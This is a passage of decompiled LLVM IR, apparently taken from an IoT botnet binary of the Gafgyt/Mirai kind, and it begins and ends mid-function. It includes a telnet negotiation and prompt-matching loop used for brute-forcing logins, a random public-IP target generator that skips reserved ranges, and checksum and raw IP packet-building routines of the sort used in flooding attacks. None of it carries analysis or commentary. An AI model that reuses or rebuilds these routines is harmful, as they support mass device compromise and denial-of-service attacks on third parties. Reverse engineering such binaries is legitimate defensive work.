  br i1 %tmp30, label %dec_label_pc_a510, label %dec_label_pc_a538

dec_label_pc_a538:                                ; preds = %dec_label_pc_a510
  %v2_a558 = load i32, i32* %v1_a558, align 4
  %v2_a56c = or i32 %v2_a558, %v6_a568
  store i32 %v2_a56c, i32* %v1_a558, align 4
  %v5_a5a8 = call i32 @__libc_select(i32 %v1_a58c, i32 %v2_a4fc, i32 0, i32 0, i32 %v2_a594)
  %tmp31 = icmp slt i32 %v5_a5a8, 1
  br i1 %tmp31, label %dec_label_pc_a734, label %dec_label_pc_a5b8

dec_label_pc_a5b8:                                ; preds = %dec_label_pc_a538
  %v2_a5c4 = add i32 %stack_var_-40.0, %arg6
  %v5_a5c8 = inttoptr i32 %v2_a5c4 to i8*
  %v6_a5dc = inttoptr i32 %v2_a5c4 to i32*
  %v7_a5dc = call i32 @__libc_recv(i32 %arg1, i32* %v6_a5dc, i32 1, i32 0, i32 %v2_a5c4)
  %v7_a5ec = icmp eq i32 %v7_a5dc, -1
  br i1 %v7_a5ec, label %dec_label_pc_a600, label %dec_label_pc_a5f4

dec_label_pc_a5f4:                                ; preds = %dec_label_pc_a5b8
  %v2_a5f8 = icmp eq i32 %v7_a5dc, 0
  br i1 %v2_a5f8, label %dec_label_pc_a600, label %dec_label_pc_a60c

dec_label_pc_a600:                                ; preds = %dec_label_pc_a5f4, %dec_label_pc_a5b8
  br label %dec_label_pc_a73c

dec_label_pc_a60c:                                ; preds = %dec_label_pc_a5f4
  %v2_a614 = add i32 %v7_a5dc, %stack_var_-40.0
  %v2_a620 = load i8, i8* %v5_a5c8, align 1
  %v2_a624 = icmp eq i8 %v2_a620, -1
  br i1 %v2_a624, label %dec_label_pc_a62c, label %dec_label_pc_a6ac

dec_label_pc_a62c:                                ; preds = %dec_label_pc_a60c
  %v1_a630 = add i32 %v2_a5c4, 1
  %v5_a644 = inttoptr i32 %v1_a630 to i32*
  %v6_a644 = call i32 @__libc_recv(i32 %arg1, i32* %v5_a644, i32 2, i32 0, i32 %v2_a614)
  %v7_a654 = icmp eq i32 %v6_a644, -1
  br i1 %v7_a654, label %dec_label_pc_a668, label %dec_label_pc_a65c

dec_label_pc_a65c:                                ; preds = %dec_label_pc_a62c
  %v2_a660 = icmp eq i32 %v6_a644, 0
  br i1 %v2_a660, label %dec_label_pc_a668, label %dec_label_pc_a674

dec_label_pc_a668:                                ; preds = %dec_label_pc_a65c, %dec_label_pc_a62c
  br label %dec_label_pc_a73c

dec_label_pc_a674:                                ; preds = %dec_label_pc_a65c
  %v2_a67c = add i32 %v6_a644, %v2_a614
  %v5_a690 = call i32 @negotiate(i32 %arg1, i32 %v2_a5c4, i32 3, i32 %v2_a67c, i32 %v2_a67c)
  %v2_a698 = icmp eq i32 %v5_a690, 0
  br i1 %v2_a698, label %dec_label_pc_a6a0, label %dec_label_pc_a6f0

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a674
  br label %dec_label_pc_a73c

dec_label_pc_a6ac:                                ; preds = %dec_label_pc_a60c
  %v3_a620 = zext i8 %v2_a620 to i32
  %v7_a6b4 = call i32 @strstr(i32 %arg6, i8* %v6_a6b4, i32 %stack_var_-40.0, i32 %v3_a620, i32 %v2_a614, i32 %v7_a5dc)
  %v2_a6bc = icmp eq i32 %v7_a6b4, 0
  br i1 %v2_a6bc, label %dec_label_pc_a6c4, label %dec_label_pc_a728

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a6ac
  br i1 %v2_a6c8, label %dec_label_pc_a6f0, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a6c4
  %v2_a6d4 = call i32 @matchPrompt(i8* %v1_a6d4)
  %v2_a6dc = icmp eq i32 %v2_a6d4, 0
  br i1 %v2_a6dc, label %dec_label_pc_a6f0, label %dec_label_pc_a728

dec_label_pc_a6f0:                                ; preds = %dec_label_pc_a674, %dec_label_pc_a6d0, %dec_label_pc_a6c4, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a67c, %dec_label_pc_a674 ], [ %v2_a614, %dec_label_pc_a6c4 ], [ %v2_a614, %dec_label_pc_a6d0 ]
  %v1_a6f4 = add i32 %stack_var_-40.0, 2
  %v6_a700 = icmp slt i32 %v1_a6f4, %arg7
  br i1 %v6_a700, label %dec_label_pc_a704, label %dec_label_pc_a734

dec_label_pc_a704:                                ; preds = %dec_label_pc_a6f0
  %v3_a704 = load i32, i32* %stack_var_-176, align 4
  %v5_a70c = icmp sgt i32 %v3_a704, 0
  br i1 %v5_a70c, label %dec_label_pc_a510.lr.ph, label %dec_label_pc_a710

dec_label_pc_a710:                                ; preds = %dec_label_pc_a704
  br i1 %v5_a718, label %dec_label_pc_a510.lr.ph, label %dec_label_pc_a734

dec_label_pc_a728:                                ; preds = %dec_label_pc_a6ac, %dec_label_pc_a6d0
  br label %dec_label_pc_a73c

dec_label_pc_a734:                                ; preds = %dec_label_pc_a538, %dec_label_pc_a710, %dec_label_pc_a6f0
  br label %dec_label_pc_a73c

dec_label_pc_a73c:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a6a0, %dec_label_pc_a668, %dec_label_pc_a600, %dec_label_pc_a734
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a734 ], [ 1, %dec_label_pc_a728 ], [ 0, %dec_label_pc_a600 ], [ 0, %dec_label_pc_a668 ], [ 0, %dec_label_pc_a6a0 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 3, 1, 0, 2 }
  uselistorder i32 %v6_a644, { 1, 2, 0 }
  uselistorder i8 %v2_a620, { 1, 0 }
  uselistorder i32 %v2_a614, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v7_a5dc, { 2, 1, 3, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a4fc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a73c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a734, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a728, { 1, 0 }
  uselistorder label %dec_label_pc_a6f0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a510, { 1, 0 }
  uselistorder label %dec_label_pc_a510.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a750 = load i32, i32* @r4, align 4
  %v6_a750 = load i32, i32* @fp, align 4
  store i32 42840, i32* %stack_var_-4, align 4
  %v2_a754 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a754, i32* @fp, align 4
  %v0_a75c = call i32 @random()
  %v2_a76c = srem i32 %v0_a75c, 223
  %v1_a77c = trunc i32 %v2_a76c to i8
  store i8 %v1_a77c, i8* bitcast (i8** @global_var_23b43.74 to i8*), align 4
  %v0_a780 = call i32 @random()
  %v2_a790 = srem i32 %v0_a780, 255
  %v1_a7a0 = trunc i32 %v2_a790 to i8
  store i8 %v1_a7a0, i8* @global_var_23b44.75, align 1
  %v0_a7a4 = call i32 @random()
  %v2_a7b4 = srem i32 %v0_a7a4, 255
  %v1_a7c4 = trunc i32 %v2_a7b4 to i8
  store i8 %v1_a7c4, i8* @global_var_23b45.76, align 1
  %v0_a7c8 = call i32 @random()
  br label %dec_label_pc_a880

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_aa90, %dec_label_pc_aa80, %dec_label_pc_aa70, %dec_label_pc_aa60, %dec_label_pc_aa50, %dec_label_pc_aa40, %dec_label_pc_aa30, %dec_label_pc_aa20, %dec_label_pc_aa10, %dec_label_pc_aa00, %dec_label_pc_a9f0, %dec_label_pc_a9e0, %dec_label_pc_a9d0, %dec_label_pc_a9c0, %dec_label_pc_a9b0, %dec_label_pc_a980, %dec_label_pc_a960, %dec_label_pc_a930, %dec_label_pc_a900, %dec_label_pc_a8e0, %dec_label_pc_a8d0, %dec_label_pc_a8c0, %dec_label_pc_a8b0, %dec_label_pc_a8a0, %dec_label_pc_a890, %dec_label_pc_a880
  %v0_a7f0 = call i32 @random()
  %v2_a800 = srem i32 %v0_a7f0, 223
  %v1_a810 = trunc i32 %v2_a800 to i8
  store i8 %v1_a810, i8* bitcast (i8** @global_var_23b43.74 to i8*), align 4
  %v0_a814 = call i32 @random()
  %v2_a824 = srem i32 %v0_a814, 255
  %v1_a834 = trunc i32 %v2_a824 to i8
  store i8 %v1_a834, i8* @global_var_23b44.75, align 1
  %v0_a838 = call i32 @random()
  %v2_a848 = srem i32 %v0_a838, 255
  %v1_a858 = trunc i32 %v2_a848 to i8
  store i8 %v1_a858, i8* @global_var_23b45.76, align 1
  %v0_a85c = call i32 @random()
  br label %dec_label_pc_a880

dec_label_pc_a880:                                ; preds = %entry, %dec_label_pc_a7f0
  %storemerge7 = phi i32 [ %v0_a7c8, %entry ], [ %v0_a85c, %dec_label_pc_a7f0 ]
  %v2_a7d8 = srem i32 %storemerge7, 255
  %extract.t4 = trunc i32 %v2_a7d8 to i8
  store i8 %extract.t4, i8* @global_var_23b46.77, align 1
  %v2_a884 = load i8, i8* bitcast (i8** @global_var_23b43.74 to i8*), align 4
  %v3_a884 = zext i8 %v2_a884 to i32
  %v7_a888 = icmp eq i8 %v2_a884, 127
  br i1 %v7_a888, label %dec_label_pc_a7f0, label %dec_label_pc_a890

dec_label_pc_a890:                                ; preds = %dec_label_pc_a880
  %v2_a898 = icmp eq i8 %v2_a884, 0
  br i1 %v2_a898, label %dec_label_pc_a7f0, label %dec_label_pc_a8a0

dec_label_pc_a8a0:                                ; preds = %dec_label_pc_a890
  %v7_a8a8 = icmp eq i8 %v2_a884, 3
  br i1 %v7_a8a8, label %dec_label_pc_a7f0, label %dec_label_pc_a8b0

dec_label_pc_a8b0:                                ; preds = %dec_label_pc_a8a0
  %v7_a8b8 = icmp eq i8 %v2_a884, 15
  br i1 %v7_a8b8, label %dec_label_pc_a7f0, label %dec_label_pc_a8c0

dec_label_pc_a8c0:                                ; preds = %dec_label_pc_a8b0
  %v7_a8c8 = icmp eq i8 %v2_a884, 16
  br i1 %v7_a8c8, label %dec_label_pc_a7f0, label %dec_label_pc_a8d0

dec_label_pc_a8d0:                                ; preds = %dec_label_pc_a8c0
  %v7_a8d8 = icmp eq i8 %v2_a884, 56
  br i1 %v7_a8d8, label %dec_label_pc_a7f0, label %dec_label_pc_a8e0

dec_label_pc_a8e0:                                ; preds = %dec_label_pc_a8d0
  %v7_a8e8 = icmp eq i8 %v2_a884, 10
  br i1 %v7_a8e8, label %dec_label_pc_a7f0, label %dec_label_pc_a8f0

dec_label_pc_a8f0:                                ; preds = %dec_label_pc_a8e0
  %v7_a8f8 = icmp eq i8 %v2_a884, -64
  br i1 %v7_a8f8, label %dec_label_pc_a900, label %dec_label_pc_a910

dec_label_pc_a900:                                ; preds = %dec_label_pc_a8f0
  %v3_a904 = load i8, i8* @global_var_23b44.75, align 1
  %v7_a908 = icmp eq i8 %v3_a904, -88
  br i1 %v7_a908, label %dec_label_pc_a7f0, label %dec_label_pc_a910

dec_label_pc_a910:                                ; preds = %dec_label_pc_a8f0, %dec_label_pc_a900
  %v7_a918 = icmp eq i8 %v2_a884, -84
  br i1 %v7_a918, label %dec_label_pc_a920, label %dec_label_pc_a940

dec_label_pc_a920:                                ; preds = %dec_label_pc_a910
  %v3_a924 = load i8, i8* @global_var_23b44.75, align 1
  %tmp = icmp ult i8 %v3_a924, 16
  br i1 %tmp, label %dec_label_pc_a940, label %dec_label_pc_a930

dec_label_pc_a930:                                ; preds = %dec_label_pc_a920
  %tmp19 = icmp ult i8 %v3_a924, 32
  br i1 %tmp19, label %dec_label_pc_a7f0, label %dec_label_pc_a940

dec_label_pc_a940:                                ; preds = %dec_label_pc_a910, %dec_label_pc_a930, %dec_label_pc_a920
  %v7_a948 = icmp eq i8 %v2_a884, 100
  br i1 %v7_a948, label %dec_label_pc_a950, label %dec_label_pc_a970

dec_label_pc_a950:                                ; preds = %dec_label_pc_a940
  %v3_a954 = load i8, i8* @global_var_23b44.75, align 1
  %tmp20 = icmp ult i8 %v3_a954, 64
  br i1 %tmp20, label %dec_label_pc_a970, label %dec_label_pc_a960

dec_label_pc_a960:                                ; preds = %dec_label_pc_a950
  %tmp21 = icmp ult i8 %v3_a954, 127
  br i1 %tmp21, label %dec_label_pc_a7f0, label %dec_label_pc_a970

dec_label_pc_a970:                                ; preds = %dec_label_pc_a940, %dec_label_pc_a960, %dec_label_pc_a950
  %v7_a978 = icmp eq i8 %v2_a884, -87
  br i1 %v7_a978, label %dec_label_pc_a980, label %dec_label_pc_a990

dec_label_pc_a980:                                ; preds = %dec_label_pc_a970
  %v3_a984 = load i8, i8* @global_var_23b44.75, align 1
  %v2_a988 = icmp eq i8 %v3_a984, -1
  br i1 %v2_a988, label %dec_label_pc_a7f0, label %dec_label_pc_a990

dec_label_pc_a990:                                ; preds = %dec_label_pc_a970, %dec_label_pc_a980
  %v7_a998 = icmp eq i8 %v2_a884, -58
  br i1 %v7_a998, label %dec_label_pc_a9a0, label %dec_label_pc_a9c0

dec_label_pc_a9a0:                                ; preds = %dec_label_pc_a990
  %v3_a9a4 = load i8, i8* @global_var_23b44.75, align 1
  %tmp22 = icmp ult i8 %v3_a9a4, 18
  br i1 %tmp22, label %dec_label_pc_a9c0, label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9a0
  %tmp23 = or i8 %v3_a9a4, 1
  %tmp24 = icmp eq i8 %tmp23, 19
  br i1 %tmp24, label %dec_label_pc_a7f0, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a990, %dec_label_pc_a9b0, %dec_label_pc_a9a0
  %v7_a9c8 = icmp eq i8 %v2_a884, -32
  br i1 %v7_a9c8, label %dec_label_pc_a7f0, label %dec_label_pc_a9d0

dec_label_pc_a9d0:                                ; preds = %dec_label_pc_a9c0
  %v7_a9d8 = icmp eq i8 %v2_a884, 6
  br i1 %v7_a9d8, label %dec_label_pc_a7f0, label %dec_label_pc_a9e0

dec_label_pc_a9e0:                                ; preds = %dec_label_pc_a9d0
  %v7_a9e8 = icmp eq i8 %v2_a884, 7
  br i1 %v7_a9e8, label %dec_label_pc_a7f0, label %dec_label_pc_a9f0

dec_label_pc_a9f0:                                ; preds = %dec_label_pc_a9e0
  %v7_a9f8 = icmp eq i8 %v2_a884, 11
  br i1 %v7_a9f8, label %dec_label_pc_a7f0, label %dec_label_pc_aa00

dec_label_pc_aa00:                                ; preds = %dec_label_pc_a9f0
  %v7_aa08 = icmp eq i8 %v2_a884, 21
  br i1 %v7_aa08, label %dec_label_pc_a7f0, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %dec_label_pc_aa00
  %v7_aa18 = icmp eq i8 %v2_a884, 22
  br i1 %v7_aa18, label %dec_label_pc_a7f0, label %dec_label_pc_aa20

dec_label_pc_aa20:                                ; preds = %dec_label_pc_aa10
  %v7_aa28 = icmp eq i8 %v2_a884, 26
  br i1 %v7_aa28, label %dec_label_pc_a7f0, label %dec_label_pc_aa30

dec_label_pc_aa30:                                ; preds = %dec_label_pc_aa20
  %v7_aa38 = icmp eq i8 %v2_a884, 28
  br i1 %v7_aa38, label %dec_label_pc_a7f0, label %dec_label_pc_aa40

dec_label_pc_aa40:                                ; preds = %dec_label_pc_aa30
  %v7_aa48 = icmp eq i8 %v2_a884, 29
  br i1 %v7_aa48, label %dec_label_pc_a7f0, label %dec_label_pc_aa50

dec_label_pc_aa50:                                ; preds = %dec_label_pc_aa40
  %v7_aa58 = icmp eq i8 %v2_a884, 30
  br i1 %v7_aa58, label %dec_label_pc_a7f0, label %dec_label_pc_aa60

dec_label_pc_aa60:                                ; preds = %dec_label_pc_aa50
  %v7_aa68 = icmp eq i8 %v2_a884, 33
  br i1 %v7_aa68, label %dec_label_pc_a7f0, label %dec_label_pc_aa70

dec_label_pc_aa70:                                ; preds = %dec_label_pc_aa60
  %v7_aa78 = icmp eq i8 %v2_a884, 55
  br i1 %v7_aa78, label %dec_label_pc_a7f0, label %dec_label_pc_aa80

dec_label_pc_aa80:                                ; preds = %dec_label_pc_aa70
  %v7_aa88 = icmp eq i8 %v2_a884, -42
  br i1 %v7_aa88, label %dec_label_pc_a7f0, label %dec_label_pc_aa90

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa80
  %v7_aa98 = icmp eq i8 %v2_a884, -41
  br i1 %v7_aa98, label %dec_label_pc_a7f0, label %dec_label_pc_aaa0

dec_label_pc_aaa0:                                ; preds = %dec_label_pc_aa90
  %v2_aaa0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 0, i32* %stack_var_-36, align 4
  %v3_aae8 = load i8, i8* @global_var_23b44.75, align 1
  %v4_aae8 = zext i8 %v3_aae8 to i32
  store i32 %v4_aae8, i32* @r4, align 4
  %v3_aaf4 = load i8, i8* @global_var_23b45.76, align 1
  %v6_ab1c = sext i8 %v3_aae8 to i32
  %v8_ab1c = sext i8 %v3_aaf4 to i32
  %v10_ab1c = sext i8 %extract.t4 to i32
  %v15_ab1c = call i32 @szprintf(i32 %v2_aaa0, i32 ptrtoint ([12 x i8]* @global_var_19448.79 to i32), i32 %v3_a884, i32 %v6_ab1c, i32 %v8_ab1c, i32 %v10_ab1c, i32 0, i32 0, i32 0, i32 0)
  store i32 %v2_aaa0, i32* @r0, align 4
  %v1_ab28 = call i32 @inet_addr(i32 %v2_aaa0)
  store i32 %v3_a750, i32* @r4, align 4
  store i32 %v6_a750, i32* @fp, align 4
  ret i32 %v1_ab28

; uselistorder directives
  uselistorder i32 %v2_aaa0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_23b45.76, { 2, 1, 0 }
  uselistorder i8* @global_var_23b44.75, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_23b43.74 to i8*), { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a990, { 1, 0 }
  uselistorder label %dec_label_pc_a970, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a940, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a910, { 1, 0 }
  uselistorder label %dec_label_pc_a880, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_ab48 = load i32, i32* @fp, align 4
  %v2_ab5c = load i32, i32* @global_var_29da8.81, align 4
  %v1_ab64 = call i32 @ntohl(i32 %v2_ab5c)
  %v2_ab70 = and i32 %v1_ab64, %arg1
  %v0_ab78 = call i32 @rand_cmwc()
  %v1_ab84 = sub i32 -1, %arg1
  %v2_ab88 = and i32 %v0_ab78, %v1_ab84
  %v2_ab90 = xor i32 %v2_ab88, %v2_ab70
  store i32 %v3_ab48, i32* @fp, align 4
  ret i32 %v2_ab90

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_ac209 = icmp sgt i32 %arg2, 1
  br i1 %v8_ac209, label %dec_label_pc_abd0, label %dec_label_pc_ac24

dec_label_pc_abd0:                                ; preds = %entry, %dec_label_pc_abd0
  %v2_abec = phi i32 [ %v2_abf0, %dec_label_pc_abd0 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_abf4, %dec_label_pc_abd0 ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_ac10, %dec_label_pc_abd0 ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_ac08, %dec_label_pc_abd0 ], [ %arg1, %entry ]
  %v4_abd0 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_abd4 = load i8, i8* %stack_var_-32.010, align 1
  %v3_abd4 = zext i8 %v2_abd4 to i32
  %v1_abd8 = add i32 %v4_abd0, 1
  %v2_abd8 = inttoptr i32 %v1_abd8 to i8*
  %v3_abd8 = load i8, i8* %v2_abd8, align 1
  %v4_abd8 = zext i8 %v3_abd8 to i32
  %v4_abdc = mul nuw nsw i32 %v4_abd8, 256
  %v5_abdc = or i32 %v4_abdc, %v3_abd4
  %v2_abf0 = add i32 %v5_abdc, %v2_abec
  %v3_abf0 = icmp ult i32 %v2_abf0, %v2_abec
  %v4_abf4 = zext i1 %v3_abf0 to i32
  %v5_abf4 = add i32 %v4_abf4, %stack_var_-40.012
  %v1_ac04 = add i32 %v4_abd0, 2
  %v5_ac08 = inttoptr i32 %v1_ac04 to i8*
  %v1_ac10 = add nsw i32 %stack_var_-36.011, -2
  %v8_ac20 = icmp sgt i32 %v1_ac10, 1
  br i1 %v8_ac20, label %dec_label_pc_abd0, label %dec_label_pc_ac24

dec_label_pc_ac24:                                ; preds = %dec_label_pc_abd0, %entry
  %v2_ac44 = phi i32 [ 0, %entry ], [ %v2_abf0, %dec_label_pc_abd0 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_ac08, %dec_label_pc_abd0 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_abf4, %dec_label_pc_abd0 ]
  %v7_ac1c.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_ac10, %dec_label_pc_abd0 ]
  %v7_ac1c.lcssa = icmp eq i32 %v7_ac1c.lcssa.in, 1
  br i1 %v7_ac1c.lcssa, label %dec_label_pc_ac30, label %dec_label_pc_acac.preheader

dec_label_pc_ac30:                                ; preds = %dec_label_pc_ac24
  %v2_ac34 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_ac34 = zext i8 %v2_ac34 to i32
  %v2_ac48 = add i32 %v3_ac34, %v2_ac44
  %v3_ac48 = icmp ult i32 %v2_ac48, %v2_ac44
  %v4_ac4c = zext i1 %v3_ac48 to i32
  %v5_ac4c = add i32 %v4_ac4c, %stack_var_-40.0.lcssa
  br label %dec_label_pc_acac.preheader

dec_label_pc_acac.preheader:                      ; preds = %dec_label_pc_ac30, %dec_label_pc_ac24
  %v3_acd8.ph = phi i32 [ %v2_ac44, %dec_label_pc_ac24 ], [ %v2_ac48, %dec_label_pc_ac30 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_ac24 ], [ %v5_ac4c, %dec_label_pc_ac30 ]
  %v3_acb036 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_acb837 = udiv i32 %v3_acd8.ph, 65536
  %v2_acbc38 = or i32 %v3_acb036, %v3_acb837
  %v3_acc439 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_accc40 = or i32 %v2_acbc38, %v3_acc439
  %v2_acd041 = icmp eq i32 %v2_accc40, 0
  br i1 %v2_acd041, label %dec_label_pc_acd8, label %dec_label_pc_ac5c

dec_label_pc_ac5c:                                ; preds = %dec_label_pc_acac.preheader, %dec_label_pc_ac5c
  %v3_acc444 = phi i32 [ %v3_acc4, %dec_label_pc_ac5c ], [ %v3_acc439, %dec_label_pc_acac.preheader ]
  %v2_acbc43 = phi i32 [ %v2_acbc, %dec_label_pc_ac5c ], [ %v2_acbc38, %dec_label_pc_acac.preheader ]
  %v3_acd842 = phi i32 [ %v2_ac9c, %dec_label_pc_ac5c ], [ %v3_acd8.ph, %dec_label_pc_acac.preheader ]
  %v2_ac70 = urem i32 %v3_acd842, 65536
  %v2_ac9c = add i32 %v2_acbc43, %v2_ac70
  %v3_ac9c = icmp ult i32 %v2_ac9c, %v2_ac70
  %v4_aca0 = zext i1 %v3_ac9c to i32
  %v5_aca0 = add nuw nsw i32 %v4_aca0, %v3_acc444
  %v3_acb0 = mul i32 %v5_aca0, 65536
  %v3_acb8 = udiv i32 %v2_ac9c, 65536
  %v2_acbc = or i32 %v3_acb0, %v3_acb8
  %v3_acc4 = udiv i32 %v5_aca0, 65536
  %v2_accc = or i32 %v2_acbc, %v3_acc4
  %v2_acd0 = icmp eq i32 %v2_accc, 0
  br i1 %v2_acd0, label %dec_label_pc_acac.dec_label_pc_acd8_crit_edge, label %dec_label_pc_ac5c

dec_label_pc_acac.dec_label_pc_acd8_crit_edge:    ; preds = %dec_label_pc_ac5c
  br label %dec_label_pc_acd8

dec_label_pc_acd8:                                ; preds = %dec_label_pc_acac.dec_label_pc_acd8_crit_edge, %dec_label_pc_acac.preheader
  %v3_acd8.lcssa = phi i32 [ %v2_ac9c, %dec_label_pc_acac.dec_label_pc_acd8_crit_edge ], [ %v3_acd8.ph, %dec_label_pc_acac.preheader ]
  %v1_ace4 = urem i32 %v3_acd8.lcssa, 65536
  %v3_acec = xor i32 %v1_ace4, 65535
  ret i32 %v3_acec

; uselistorder directives
  uselistorder i32 %v2_acbc, { 1, 0 }
  uselistorder i32 %v5_aca0, { 1, 0 }
  uselistorder i32 %v2_ac9c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_acc439, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_acd8.ph, { 2, 1, 0 }
  uselistorder i32 %v2_ac44, { 0, 2, 1 }
  uselistorder i32 %v1_ac10, { 0, 2, 1 }
  uselistorder i32 %v2_abf0, { 0, 2, 1 }
  uselistorder i32 %v2_abec, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ac5c, { 1, 0 }
  uselistorder label %dec_label_pc_abd0, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_ad00 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_ad38 = add i32 %arg1, 12
  %v2_ad38 = inttoptr i32 %v1_ad38 to i32*
  %v3_ad38 = load i32, i32* %v2_ad38, align 4
  store i32 %v3_ad38, i32* %stack_var_-44, align 4
  %v1_ad60 = call i32 @htons(i32 20)
  %v1_ad84 = call i32 @malloc(i32 32)
  %v2_ad94 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_ad84, i32* @r0, align 4
  store i32 %v2_ad94, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_ada8 = call i32 @memcpy()
  %v1_adb0 = add i32 %v1_ad84, 12
  %v3_adb4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_adb0, i32* @r0, align 4
  store i32 %v3_adb4, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_adc8 = call i32 @memcpy()
  %v2_add4 = inttoptr i32 %v1_ad84 to i8*
  %v3_add4 = call i32 @csum(i8* %v2_add4, i32 32)
  %sext2 = mul i32 %v3_add4, 16777216
  %v3_ade0 = ashr i32 %sext2, 31
  store i32 %v1_ad84, i32* @r0, align 4
  %v0_adec = call i32 @free()
  %v3_adf4 = sdiv i32 %sext2, 16777216
  %v4_adf8 = mul nsw i32 %v3_ade0, 256
  %v4_adfc = and i32 %v4_adf8, 65280
  %v5_adfc = or i32 %v4_adfc, %v3_adf4
  store i32 %v3_ad00, i32* @fp, align 4
  ret i32 %v5_adfc

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_ad84, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp5 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_ae10 = load i32, i32* @fp, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v2_ae30 = load i8, i8* %arg1, align 1
  %v4_ae38 = zext i8 %v2_ae30 to i32
  %v1_ae3c = and i32 %v4_ae38, 240
  %v1_ae40 = or i32 %v1_ae3c, 5
  store i32 %v1_ae40, i32* %r3.global-to-local, align 4
  %v1_ae4c = trunc i32 %v1_ae40 to i8
  store i8 %v1_ae4c, i8* %arg1, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_ae7c = add i32 %tmp5, 1
  %v4_ae7c = inttoptr i32 %v3_ae7c to i8*
  store i8 0, i8* %v4_ae7c, align 1
  %v3_ae80 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_ae80, 20
  %v3_ae94 = urem i32 %fold, 65536
  store i32 %v3_ae94, i32* %r3.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v1_ae9c = trunc i32 %fold to i8
  %v3_ae9c = add i32 %tmp5, 2
  %v4_ae9c = inttoptr i32 %v3_ae9c to i8*
  store i8 %v1_ae9c, i8* %v4_ae9c, align 1
  %v0_aea0 = load i32, i32* %r3.global-to-local, align 4
  %v3_aea0 = sdiv i32 %v0_aea0, 256
  store i32 %v3_aea0, i32* %r3.global-to-local, align 4
  %v1_aea4 = trunc i32 %v3_aea0 to i8
  %v2_aea4 = load i32, i32* %r2.global-to-local, align 4
  %v3_aea4 = add i32 %v2_aea4, 3
